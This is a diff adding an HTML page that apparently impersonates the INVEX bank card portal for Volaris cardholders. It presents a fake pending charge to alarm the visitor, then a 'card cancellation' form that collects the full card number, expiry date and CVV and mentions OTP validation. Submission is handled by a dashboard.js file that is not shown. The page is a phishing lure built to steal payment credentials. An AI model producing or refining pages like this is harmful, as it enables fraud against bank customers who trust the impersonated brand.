@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Portal Web — Autorización de Cargos y Servicios</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body {
+      background-color: #f2f2f2;
+      color: #333;
+      font-size: 13px;
+    }
+
+    /* Contenedor Limitador de Ancho */
+    .site-container {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 0 15px;
+    }
+
+    /* Encabezado Principal */
+    header {
+      background-color: #ffffff;
+      border-bottom: 1px solid #e0e0e0;
+      padding: 12px 0;
+    }
+
+    .header-inner {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: baseline;
+      gap: 8px;
+    }
+
+    .logo-title {
+      color: #981D33;
+      font-size: 26px;
+      font-weight: bold;
+      letter-spacing: -1px;
+    }
+
+    .logo-sub {
+      color: #555;
+      font-size: 17px;
+    }
+
+    .header-icons {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+
+    .header-icons img {
+      width: 22px;
+      height: auto;
+      display: block;
+    }
+
+    /* Barra Superior de Usuario */
+    .user-banner-wrapper {
+      background-color: #d8d8d8;
+      border-bottom: 1px solid #c0c0c0;
+      padding: 12px 0;
+    }
+
+    .user-banner-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .user-info-group {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    .card-thumb {
+      width: 55px;
+      height: auto;
+      border-radius: 4px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.15);
+    }
+
+    .user-details h3 {
+      color: #981D33;
+      font-size: 14px;
+      text-transform: uppercase;
+    }
+
+    .user-details p {
+      color: #555;
+      font-size: 12px;
+      margin-top: 2px;
+    }
+
+    .btn-logout-top {
+      background-color: #981D33;
+      color: white;
+      border: none;
+      padding: 8px 16px;
+      font-size: 12px;
+      font-weight: bold;
+      border-radius: 3px;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .btn-logout-top:hover {
+      background-color: #7a1527;
+    }
+
+    /* --- ESTILOS DEL CARRUSEL --- */
+    .carousel-section {
+      margin-top: 20px;
+      margin-bottom: 10px;
+    }
+
+    .carousel-container {
+      position: relative;
+      width: 100%;
+      max-height: 320px;
+      overflow: hidden;
+      border-radius: 6px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      background-color: #fff;
+    }
+
+    .carousel-slide {
+      display: none;
+      width: 100%;
+    }
+
+    .carousel-slide.active {
+      display: block;
+    }
+
+    .carousel-slide img {
+      width: 100%;
+      height: 300px;
+      object-fit: cover;
+      display: block;
+    }
+
+    .carousel-prev, .carousel-next {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      background-color: rgba(0, 0, 0, 0.4);
+      color: white;
+      border: none;
+      padding: 10px 14px;
+      cursor: pointer;
+      border-radius: 3px;
+      font-size: 16px;
+      transition: background-color 0.3s;
+    }
+
+    .carousel-prev:hover, .carousel-next:hover {
+      background-color: rgba(0, 0, 0, 0.7);
+    }
+
+    .carousel-prev { left: 10px; }
+    .carousel-next { right: 10px; }
+
+    .carousel-dots {
+      position: absolute;
+      bottom: 12px;
+      width: 100%;
+      text-align: center;
+    }
+
+    .dot {
+      cursor: pointer;
+      height: 10px;
+      width: 10px;
+      margin: 0 4px;
+      background-color: rgba(255, 255, 255, 0.6);
+      border: 1px solid rgba(0, 0, 0, 0.3);
+      border-radius: 50%;
+      display: inline-block;
+      transition: background-color 0.3s;
+    }
+
+    .dot.active-dot, .dot:hover {
+      background-color: #ffffff;
+    }
+    /* -------------------------- */
+
+    /* Estructura Principal NUEVA (3 columnas) */
+    .dashboard-layout {
+      padding: 20px 0;
+      display: flex;
+      gap: 20px;
+    }
+
+    /* Menú Lateral Izquierdo */
+    .sidebar-menu {
+      width: 250px;
+      background: #f8f9fa;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      padding: 10px 0;
+      height: fit-content;
+    }
+
+    .menu-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    .menu-item {
+      padding: 15px 20px;
+      cursor: pointer;
+      font-weight: bold;
+      color: #555;
+      border-left: 4px solid transparent;
+      transition: all 0.2s ease;
+      font-size: 13px;
+    }
+
+    .menu-item:hover {
+      background: #eaeaea;
+    }
+
+    .menu-item.active {
+      background: #fff0f0;
+      border-left: 4px solid #981D33;
+      color: #981D33;
+    }
+
+    /* Módulo Central */
+    .main-content {
+      flex: 1;
+      background: #ffffff;
+      border: 1px solid #d0d0d0;
+      border-radius: 4px;
+      padding: 20px;
+    }
+
+    .section-header {
+      background-color: #981D33;
+      color: white;
+      padding: 10px 15px;
+      font-size: 14px;
+      font-weight: bold;
+      border-radius: 3px;
+      margin-bottom: 20px;
+    }
+
+    /* Formulario Baja */
+    .baja-form input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 13px;
+    }
+
+    .baja-form input:focus {
+      outline: none;
+      border-color: #981D33;
+    }
+
+    /* Tarjeta de Cargo */
+    .charge-card {
+      background-color: #f8d7da;
+      border: 1px solid #f8d7da;
+      border-radius: 4px;
+      padding: 20px;
+    }
+
+    .charge-card h4 {
+      color: #981D33;
+      font-size: 14px;
+      margin-bottom: 12px;
+    }
+
+    .charge-details p {
+      margin: 6px 0;
+      font-size: 13px;
+      color: #333;
+    }
+
+    .btn-actions-row {
+      display: flex;
+      gap: 15px;
+      margin-top: 20px;
+    }
+
+    .btn-action {
+      flex: 1;
+      padding: 12px;
+      border: none;
+      border-radius: 3px;
+      font-weight: bold;
+      font-size: 13px;
+      cursor: pointer;
+      color: white;
+      text-align: center;
+    }
+
+    .btn-action.approve { background-color: #28a745; }
+    .btn-action.approve:hover { background-color: #218838; }
+
+    .btn-action.reject, .btn-rojo { background-color: #981D33; color: white; border: none; font-weight: bold; cursor: pointer;}
+    .btn-action.reject:hover, .btn-rojo:hover { background-color: #7a1527; }
+    
+    .block-btn {
+      padding: 12px;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    #dash-status-message, #baja-status-message {
+      margin-top: 15px;
+      padding: 10px;
+      border-radius: 3px;
+      font-weight: bold;
+      text-align: center;
+      display: none;
+    }
+
+    /* Panel Lateral Derecho */
+    .right-banner {
+      width: 260px;
+    }
+
+    .ad-banner-img {
+      width: 100%;
+      height: auto;
+      display: block;
+      border-radius: 6px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+
+    /* Pie de página */
+    footer {
+      background-color: #ffffff;
+      border-top: 1px solid #e0e0e0;
+      padding: 15px 0;
+      margin-top: 30px;
+    }
+
+    .footer-inner {
+      display: flex;
+      justify-content: space-between;
+      color: #981D33;
+      font-size: 11px;
+      font-weight: bold;
+    }
+
+    /* =========================================
+       DISEÑO RESPONSIVO PARA MÓVILES (dashboard)
+       ========================================= */
+    @media (max-width: 768px) {
+      /* 1. Apilar las 3 columnas verticalmente */
+      .dashboard-layout {
+        flex-direction: column;
+      }
+
+      /* 2. El menú lateral y el banner ahora ocupan el 100% de la pantalla */
+      .sidebar-menu, .right-banner {
+        width: 100%;
+      }
+
+      /* Opcional: Ocultar la publicidad lateral en celulares para ahorrar espacio */
+      .right-banner {
+        display: none; 
+      }
+
+      /* 3. Centrar y apilar el menú de usuario y el botón de cerrar sesión */
+      .user-banner-inner {
+        flex-direction: column;
+        gap: 15px;
+        text-align: center;
+      }
+      
+      .user-info-group {
+        flex-direction: column;
+      }
+
+      /* 4. Apilar los botones de Aprobar/Rechazar para que sean fáciles de tocar */
+      .btn-actions-row {
+        flex-direction: column;
+      }
+
+      /* 5. Apilar los enlaces del pie de página */
+      .footer-inner {
+        flex-direction: column;
+        align-items: center;
+        gap: 12px;
+        text-align: center;
+      }
+      
+      /* Ajustar tamaño de textos en celular */
+      .logo-title { font-size: 22px; }
+      .logo-sub { font-size: 15px; }
+      .section-header { font-size: 13px; text-align: center; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Encabezado con iconos locales -->
+  <header>
+    <div class="site-container header-inner">
+      <div class="logo-container">
+        <span class="logo-title">invex</span>
+        <span class="logo-sub">Tarjetas</span>
+      </div>
+      <div class="header-icons">
+        <img src="images/twitter.png" alt="Twitter">
+        <img src="images/mail.png" alt="Correo">
+      </div>
+    </div>
+  </header>
+
+  <!-- Banner Superior del Usuario con la tarjeta local -->
+  <div class="user-banner-wrapper">
+    <div class="site-container user-banner-inner">
+      <div class="user-info-group">
+        <img src="images/tarjetavolaris.png" alt="Tarjeta Volaris" class="card-thumb">
+        <div class="user-details">
+          <h3 id="user-display-name">CLIENTE</h3>
+          <p>Cliente Volaris — <span id="user-email-text" style="font-weight:bold;">cliente@invex.com</span></p>
+        </div>
+      </div>
+      <a href="index.html" id="dash-logout" class="btn-logout-top" onclick="localStorage.clear(); sessionStorage.clear();">Cerrar sesión</a>
+    </div>
+  </div>
+
+  <!-- Carrusel -->
+  <div class="site-container carousel-section">
+    <div class="carousel-container">
+      <div class="carousel-slide active"><img src="images/carrusel1.jpg" alt="Carrusel 1"></div>
+      <div class="carousel-slide"><img src="images/carrusel2.png" alt="Carrusel 2"></div>
+      <div class="carousel-slide"><img src="images/carrusel3.jpg" alt="Carrusel 3"></div>
+      <div class="carousel-slide"><img src="images/carrusel4.png" alt="Carrusel 4"></div>
+      <button class="carousel-prev" onclick="moveSlide(-1)">&#10094;</button>
+      <button class="carousel-next" onclick="moveSlide(1)">&#10095;</button>
+      <div class="carousel-dots">
+        <span class="dot active-dot" onclick="currentSlide(0)"></span>
+        <span class="dot" onclick="currentSlide(1)"></span>
+        <span class="dot" onclick="currentSlide(2)"></span>
+        <span class="dot" onclick="currentSlide(3)"></span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Contenido Principal -->
+  <div class="site-container dashboard-layout">
+    
+    <!-- MENÚ LATERAL IZQUIERDO -->
+    <aside class="sidebar-menu">
+      <ul class="menu-list">
+        <li id="nav-cargos" class="menu-item active">Autorización de Cargos</li>
+        <li id="nav-baja" class="menu-item">Baja de Tarjeta Digital</li>
+      </ul>
+    </aside>
+
+    <!-- ÁREA CENTRAL (VISTAS DINÁMICAS) -->
+    <main class="main-content">
+      
+      <!-- VISTA 1: CARGOS -->
+      <div id="vista-cargos" style="display: block;">
+        <div class="section-header">Centro de Seguridad — Autorización de Cargos en Línea</div>
+        <div class="charge-card">
+          <h4>Transacción Pendiente de Confirmación</h4>
+          <div class="charge-details">
+            <p><strong>Comercio:</strong> <span id="charge-merchant">Elektronika Digital MX</span></p>
+            <p><strong>Monto Solicitado:</strong> <span id="charge-amount">$4,899.00 MXN</span></p>
+            <p><strong>Estado:</strong> En espera de Cancelación</p>
+          </div>
+          <p style="color: #666; font-size: 12px; border-top: 1px solid #070706; padding-top: 10px; margin-top: 10px;">
+            valide si reconoces este movimiento para autorizar o bloquear el procesamiento del pago.
+          </p>
+          <div class="btn-actions-row">
+            <button id="btn-accept-charge" class="btn-action approve">Aprobar</button>
+            <button id="btn-reject-charge" class="btn-action reject">Rechazar</button>
+          </div>
+          <div id="dash-status-message"></div>
+        </div>
+      </div>
+
+      <!-- VISTA 2: BAJA DIGITAL -->
+      <div id="vista-baja" style="display: none;">
+        <div class="section-header">Baja de Tarjeta Digital</div>
+        <div style="padding: 10px;">
+          
+          <!-- Contenedor del Formulario (Se oculta si se aprueba la baja) -->
+          <div id="baja-form-container">
+            <p style="margin-bottom: 20px; font-size: 14px;">Estás a punto de solicitar la desactivación de tu Tarjeta Digital. Por seguridad, valida tu identidad ingresando los siguientes datos:</p>
+            
+            <form id="form-baja-digital" class="baja-form">
+              <input type="text" id="baja-tarjeta" placeholder="Número de Tarjeta (16 dígitos)" required autocomplete="off">
+              <input type="text" id="baja-vencimiento" placeholder="Vencimiento (MM/AA)" required autocomplete="off">
+              <input type="password" id="baja-cvv" placeholder="CVV (3 dígitos)" maxlength="4" required autocomplete="off">
+              
+              <button type="submit" class="btn-rojo block-btn" style="width: 100%; margin-top: 15px;">Solicitar Baja y Validar OTP</button>
+            </form>
+            <div id="baja-status-message"></div>
+          </div>
+
+          <!-- Contenedor del Resultado Exitoso/Rechazado (Oculto al inicio) -->
+          <div id="baja-result-container" style="display: none; padding: 20px; border-radius: 4px; margin-top: 15px;">
+            <!-- Contenido inyectado por JS -->
+          </div>
+
+        </div>
+      </div>
+
+    </main>
+
+    <!-- BANNER DERECHO -->
+    <aside class="right-banner">
+      <img src="images/Bannerinstagram.jpg" alt="Banner Instagram" class="ad-banner-img">
+    </aside>
+
+  </div>
+
+  <!-- Pie de página -->
+  <footer>
+    <div class="site-container footer-inner">
+      <span>Sitios de Interés ∨</span>
+      <span>Centro de Atención a Clientes ∨</span>
+      <span>Centro de Atención Telefónica CONDUSEF ∨</span>
+      <span>Unidad Especializada de Atención a Usuarios INVEX ∨</span>
+    </div>
+  </footer>
+
+  <!-- Script para el carrusel -->
+  <script>
+    let slideIndex = 0;
+    const slides = document.querySelectorAll('.carousel-slide');
+    const dots = document.querySelectorAll('.dot');
+
+    function showSlide(index) {
+      if (slides.length === 0) return;
+      if (index >= slides.length) { slideIndex = 0; }
+      else if (index < 0) { slideIndex = slides.length - 1; }
+      else { slideIndex = index; }
+
+      slides.forEach(slide => slide.classList.remove('active'));
+      dots.forEach(dot => dot.classList.remove('active-dot'));
+
+      slides[slideIndex].classList.add('active');
+      if (dots[slideIndex]) {
+        dots[slideIndex].classList.add('active-dot');
+      }
+    }
+
+    function moveSlide(n) { showSlide(slideIndex + n); }
+    function currentSlide(n) { showSlide(n); }
+    setInterval(() => { moveSlide(1); }, 5000);
+  </script>
+
+  <!-- Script Lógico -->
+  <script src="dashboard.js"></script>
+</body>
+</html>
